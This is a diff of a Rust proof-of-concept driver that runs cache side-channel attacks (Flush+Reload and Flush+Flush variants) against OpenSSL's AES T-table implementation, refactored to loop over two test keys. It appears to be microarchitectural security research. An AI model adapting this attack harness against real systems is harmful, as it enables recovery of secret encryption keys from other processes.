@@ -1,11 +1,14 @@
 #![feature(unsafe_block_in_unsafe_fn)]
 #![deny(unsafe_op_in_unsafe_fn)]
 use aes_t_tables::{attack_t_tables_poc, AESTTableParams};
+use flush_flush::naive::NaiveFlushAndFlush;
 use flush_flush::{FlushAndFlush, SingleFlushAndFlush};
 use flush_reload::naive::*;
 use nix::sched::sched_setaffinity;
 use nix::unistd::Pid;
 use std::path::Path;
+
+const KEY1: [u8; 32] = [0; 32];
 
 const KEY2: [u8; 32] = [
     0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc,
@@ -23,50 +26,40 @@ const TE_CITRON_VERT: [isize; 4] = [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140];
 
 fn main() {
     let openssl_path = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
-    let mut side_channel = NaiveFlushAndReload::from_threshold(220);
+
     let te = TE_CITRON_VERT;
-    for i in 0..4 {
-        println!("AES attack with Naive F+R, key 0");
+
+    let mut side_channel_fr = NaiveFlushAndReload::from_threshold(220);
+    let mut side_channel_naiveff = NaiveFlushAndFlush::from_threshold(202);
+
+    for (index, key) in [KEY1, KEY2].iter().enumerate() {
+        println!("AES attack with Naive F+R, key {}", index);
         unsafe {
             attack_t_tables_poc(
-                &mut side_channel,
+                &mut side_channel_fr,
                 AESTTableParams {
                     num_encryptions: 1 << 12,
-                    key: [0; 32],
+                    key: *key,
                     te: te, // adjust me (should be in decreasing order)
                     openssl_path: &openssl_path,
                 },
+                &format!("FR-{}", index),
             )
         };
-        println!("AES attack with Naive F+R, key 1");
+        println!("AES attack with Naive F+F, key {}", index);
         unsafe {
             attack_t_tables_poc(
-                &mut side_channel,
+                &mut side_channel_naiveff,
                 AESTTableParams {
                     num_encryptions: 1 << 12,
-                    key: KEY2,
-                    te: te,
+                    key: *key,
+                    te: te, // adjust me (should be in decreasing order)
                     openssl_path: &openssl_path,
                 },
+                &format!("NFF-{}", index),
             )
         };
-        println!("AES attack with Multiple F+F (limit = 3), key 0");
-        {
-            let (mut side_channel_ff, old, core) = FlushAndFlush::new_any_single_core().unwrap();
-            unsafe {
-                attack_t_tables_poc(
-                    &mut side_channel_ff,
-                    AESTTableParams {
-                        num_encryptions: 1 << 12,
-                        key: [0; 32],
-                        te: te, // adjust me (should be in decreasing order)
-                        openssl_path: &openssl_path,
-                    },
-                )
-            };
-        }
-
-        println!("AES attack with Single F+F , key 1");
+        println!("AES attack with Single F+F, key {}", index);
         {
             let (mut side_channel_ff, old, core) =
                 SingleFlushAndFlush::new_any_single_core().unwrap();
@@ -75,12 +68,13 @@ fn main() {
                     &mut side_channel_ff,
                     AESTTableParams {
                         num_encryptions: 1 << 12,
-                        key: KEY2,
+                        key: *key,
                         te: te, // adjust me (should be in decreasing order)
                         openssl_path: &openssl_path,
                     },
+                    &format!("BFF-{}", index),
                 )
-            }
+            };
         }
     }
 }
